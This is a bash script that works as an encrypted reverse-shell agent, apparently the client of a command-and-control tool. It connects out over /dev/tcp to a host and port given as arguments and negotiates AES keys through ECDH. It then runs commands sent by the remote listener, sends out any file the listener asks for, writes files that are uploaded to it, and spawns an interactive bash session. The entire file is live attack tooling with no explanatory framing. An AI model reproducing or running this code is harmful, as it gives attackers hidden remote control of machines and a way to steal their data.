#!/bin/bash


# TODO: Improve upload and download concerning the dest path
# TODO: Perform more checks (ie is script present on the fs? If not use python
#       to spawn a pty?)
# TODO: Return error messages
# TODO: Improve json reading


prompt() {
    [ "$EUID" -eq 0 ] && symbol='#' || symbol='$'
    echo -n "$(whoami)@$(hostname):$(pwd)$symbol" | base64 -w 0
}


crypt_message() {
    echo -n "$1" | xxd -r -p | openssl enc -aes-128-cbc \
                                -iv "$2" -nosalt \
                                -K "$3" \
                 | xxd -p | tr -d '\n'
}


decrypt_message() {
    echo -n "$1" | xxd -r -p | openssl enc -aes-128-cbc -d \
                                 -iv "$2" -nosalt \
                                 -K "$3" \
                  | xxd -p | tr -d '\n'
}


random_iv() {
    dd if=/dev/urandom bs=1 count=16 2>/dev/null | od -A n -v -t x1 | tr -d ' \n'
}


receive_data() {
    data_size=$1
    data=$(dd iflag=fullblock bs=$data_size count=1 <&3 2>/dev/null \
            | od -A n -v -t x1 | tr -d ' \n')

    if [ ${#data} -lt $((data_size * 2)) ]; then
        return 1
    fi

    echo -n $data
    return 0
}

receive_packet() {
    key=$1
    [ "$key" == '' ] && encrypted=false || encrypted=true
    size=$(receive_data 4)
    if [ $? -ne 0 ]; then
        return 1
    fi

    size=$((16#$size))

    if [ $size -eq 0 ]; then
        return 1
    fi

    if $encrypted; then
        iv=$(receive_data 16)
        if [ $? -ne 0 ]; then
            return 1
        fi
    fi

    packet=$(receive_data $size)
    if [ $? -ne 0 ]; then
        return 1
    fi

    if $encrypted; then
        packet=$(decrypt_message "$packet" "$iv" "$key")
    fi

    echo $packet
    return 0
}


send_packet() {
    packet="$1"
    if [ "$packet" == '' ]; then
        return 0
    fi

    key="$2"
    [ "$key" == '' ] && encrypt=false || encrypt=true

    if $encrypt; then
        iv=$(random_iv)
        packet=$(crypt_message "$packet" "$iv" "$key")
    fi

    size=$(($(echo -n "$packet" | wc -c) / 2))

    printf '%08x\n' $size | xxd -r -p 1>&3
    if $encrypt; then
        echo -n "$iv" | xxd -r -p 1>&3
    fi
    echo -n "$packet" | xxd -r -p 1>&3
}


read_interactive_mode() {
    key="$2"
    while true; do
        packet=$(receive_packet "$key")
        if [ $? -ne 0 ]; then
            return 1
        fi
        echo -n "$packet" | xxd -r -p 1>&5
    done
}


write_interactive_mode() {
    key="$1"
    while true; do
        msg=$(dd bs=1024 count=1 <&4 2>/dev/null \
            | od -A n -v -t x1 | tr -d ' \n')

        if [ "$msg" == '' ]; then
            return 1
        fi

        send_packet 'ba'$msg "$key"
    done
}


exec 3<>/dev/tcp/$1/$2

aes_key=''
which openssl 2>&1 >/dev/null
[ $? -eq 0 ] && encryption_supported='true' || encryption_supported='false'


hello_message='{"action": "hello", "args": {"features": ["download", "encrypt",
    "interactive", "upload"], "os": "Linux", "encryption": {"supported": '$encryption_supported',
    "enabled": '$encryption_supported

if [ "$encryption_supported" == 'true' ]; then
    pr=$(openssl ecparam -name secp384r1 -genkey -noout 2>/dev/null)
    pb=$(echo "$pr" | openssl ec -in /dev/stdin -pubout 2>/dev/null)
    hello_message=$hello_message', "pbkey": "'$(echo -n "$pb" | base64 -w 0)'"'
fi

hello_message=$hello_message'}}, "prompt": "'$(prompt)'"}'
send_packet $(echo -n $hello_message | od -A n -v -t x1 | tr -d ' \n') $aes_key


while true; do
    packet=$(receive_packet "$aes_key")
    if [ $? -ne 0 ]; then
        exit 0
    fi

    packet=$(echo -n $packet | xxd -r -p)

    action=$(echo $packet | grep -oP '(?<="action": ")[a-z]+(?=")')
    if [ "$action" == 'hello' ]; then
        encryption_enabled=$(echo $packet | grep -oP '(?<="enabled": )[a-zA-Z0-9]+(?=,)')
        if [ "$encryption_enabled" == 'false' ]; then
            continue
        fi

        listener_pbkey=$(mktemp)
        echo $packet | grep -oP '(?<="pbkey": ")[a-zA-Z0-9/\+=]+(?=")' \
            | base64 -d > $listener_pbkey

        shared_key=$(echo "$pr" | openssl pkeyutl -derive -inkey /dev/stdin \
            -peerkey $listener_pbkey | xxd -p | tr -d '\n')
        aes_key=$(openssl pkeyutl -kdf HKDF -kdflen 16 -pkeyopt md:SHA256 \
            -pkeyopt key:$shared_key | xxd -p | tr -d '\n')
    elif [ "$action" == 'cmd' ]; then
        cmd=$(echo $packet | grep -oP '(?<="cmd": ")[a-zA-Z0-9/\+=]+(?=")' \
            | base64 -d)
        out_file=$(mktemp)
        err_file=$(mktemp)
        $cmd 1>$out_file  2>$err_file

        response='{"action": "cmd", "message": "'$(cat $out_file | base64 -w 0)'",'
        if [ -s $err_file ]; then
            response=$response'"error": "'$(cat $err_file | base64 -w 0)'",'
        fi
        rm -rf out_file
        rm -rf err_file
        response=$response'"prompt": "'$(prompt)'"}'

        send_packet $(echo -n "$response" | od -A n -v -t x1 | tr -d ' \n') \
            "$aes_key"
    elif [ "$action" == 'download' ]; then
        file_path=$(echo $packet | grep -oP '(?<="path": ")[a-zA-Z0-9/\+=]+(?=")' \
            | base64 -d)

        response='{"action": "download",'
        err=''
        if [ ! -e $file_path ]; then
            err="Error: $file_path does not exist"
        elif [ ! -f $file_path ]; then
            err="Error: $file_path is a directory"
        fi

        if [ "$err" == '' ]; then
            file_size=$(du -b $file_path | cut -f1)
            response=$response'"args": {"size": '$file_size'}}'
        else
            response=$response'"error": "'$(echo $err | base64 -w 0)'"}'
        fi
        send_packet $(echo -n "$response" | od -A n -v -t x1 | tr -d ' \n') \
            "$aes_key"

        if [ "$err" != '' ]; then
            continue
        fi

        skip=0
        while true; do
            data=$(dd if=$file_path bs=4096 count=1 skip=$skip 2>/dev/null \
                    | od -A n -v -t x1 | tr -d ' \n')
            send_packet "$data" "$aes_key"
            skip=$((skip + 1))
            if [ ${#data} -lt 8192 ]; then
                break
            fi
        done
    elif [ "$action" == 'upload' ]; then
        file_size=$(echo $packet | grep -oP '(?<="size": )[0-9]+(?=,)')
        file_dest=$(echo $packet | grep -oP '(?<="dest": ")[a-zA-Z0-9/\+=]+(?=")' \
            | base64 -d)
        file_name=$(echo $packet | grep -oP '(?<="filename": ")[a-zA-Z0-9/\+=]+(?=")' \
            | base64 -d)
        # TODO: Handle possible errors due to permissions
        send_packet $(echo -n '{"action": "upload"}' | od -A n -v -t x1
            | tr -d ' \n') "$aes_key"

        rm -rf "$file_dest/$file_name"
        remaining=$file_size
        while true; do
            packet=$(receive_packet $aes_key)
            if [ $? -ne 0 ]; then
                rm -rf "$file_dest/$file_name"
                exit 0
            fi

            echo -n $packet | xxd -r -p >> "$file_dest/$file_name"
            packet_size=${#packet}
            remaining=$((remaining - packet_size / 2))
            echo $remaining
            if [ $remaining -eq 0 ]; then
                break
            fi
        done

        res='{"action": "upload", "message": "'$(echo 'Successfully uploaded' \
            | base64)'"}'
        send_packet $(echo -n $res | od -A n -v -t x1 | tr -d ' \n') "$aes_key"
    elif [ "$action" == 'interactive' ]; then
        pipe_dir=$(mktemp -d)
        pipe1="$pipe_dir/1"
        pipe2="$pipe_dir/2"
        mkfifo "$pipe1"
        mkfifo "$pipe2"
        exec 4<>"$pipe1"
        exec 5<>"$pipe2"

        script -q -c /bin/bash /dev/null 1>&4 2>&1 0<&5 &
        script_pid=$!
        (write_interactive_mode "$aes_key" &) >/dev/null 2>&1
        write_pid=$!
        (read_interactive_mode $script_pid "$aes_key" &) >/dev/null 2>&1

        wait $script_pid

        exec 4<&-
        exec 4>&-
        exec 5<&-
        exec 5>&-

        # let write_interactive_mode send all it has to send before sending the
        # interactive mode end message
        sleep 1

        pkill -P $write_pid >/dev/null 2>&1
        kill -9 $write_pid >/dev/null 2>&1

        rm -rf pipe_dir

        send_packet 'bb' "$aes_key"  # Send interactive mode end message to listener
    fi
done